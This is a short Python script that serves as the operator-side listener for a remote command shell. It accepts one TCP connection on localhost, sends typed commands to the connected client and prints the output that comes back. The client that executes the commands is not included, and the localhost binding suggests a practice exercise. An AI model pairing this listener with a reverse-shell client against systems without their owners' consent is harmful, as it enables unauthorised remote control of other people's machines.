#!/usr/bin/python3

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("127.0.0.1", 12345))
print("-" * 60)
server.listen()
print("Server is online...\nListening to connections...")
client, address = server.accept()
print(f"Connected to: {address}")
print("-" * 60)

try:
    while True:
        pwd = client.recv(1024)
        cmd = input(f"{pwd} $ ")
        client.send(cmd.encode())
        if cmd == "exit()":
            break
        received_data = b""
        while True:
            data = client.recv(1024)
            if not data:
                break
            received_data += data
            if b"END_OF_OUTPUT" in received_data:
                output, _ = received_data.split(b"END_OF_OUTPUT", 1)
                print(output.decode())
                break
except KeyboardInterrupt:
    print("\nExiting due to KeyboardInterrupt.")
except BrokenPipeError:
    print("\nServer closed the connection.")
finally:
    client.close()
    server.close()
